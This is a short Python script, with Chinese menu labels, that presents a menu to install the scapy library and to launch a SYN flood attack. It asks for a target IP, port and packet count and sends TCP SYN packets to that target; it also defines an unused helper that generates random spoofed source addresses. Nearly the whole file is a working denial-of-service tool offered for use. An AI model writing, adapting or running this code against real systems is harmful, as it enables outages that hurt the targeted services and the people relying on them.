import sys
import scapy.all as sca
import random
import threading
import os
#from pipe_install import Install

class Install:

    def install():
        try:
            command = 'python -m pip install scapy'
            with os.popen(command,'r') as p:
                r = p.read()
                if __name__== '__main__':
                    print(r)
        except:
            command = 'python3 -m pip install scapy'
            with os.popen(command,'r') as p:
                r = p.read()
                if __name__== '__main__':
                    print(r)
        return r

class Option:

    # 建構式
    def __init__(self, number, descritpion):
        self.number = number  # 編號
        self.descritpion = descritpion  # 說明文字

class syn_flood:

    def __init__(self) -> None:
        pass

    def randomSrcGenerate():
        ip=".".join(map(str,(random.randint(0,255) for i in range(4))))
        port=random.randint(1000,10000)
        return ip,port

    def constructSYNPacket(dst,dport,count):
        pkt = sca.IP(dst=dst)/sca.TCP(dport=dport,flags='S')
        sca.send(pkt,count=count)


    def attack():
        dst = input("Target IP:")
        dport = int(input("Target Port:"))
        count = int(input("How many packet:"))
        syn_flood.constructSYNPacket(dst,dport,count)

    def MyOption():
        MyoptionList = []
        MyoptionList.append(Option(1, "如果是第一次使用，請按1安裝必要套件"))
        MyoptionList.append(Option(2, "發動SYN Flood攻擊"))
        for option in MyoptionList:
            print("[ {} ] {}".format(option.number,option.descritpion) )
        print("[", 99, "]", " exit")

        s = input("which one:").strip()
        if s == '1':
            r = Install.install()
            if r[0:10] == 'Defaulting':
                print('you have already have the scapy')
            else:
                print(r)
        elif s == '2':
            syn_flood.attack()
        elif s == '99':
            sys.exit()

if __name__ == '__main__':
    syn_flood.MyOption()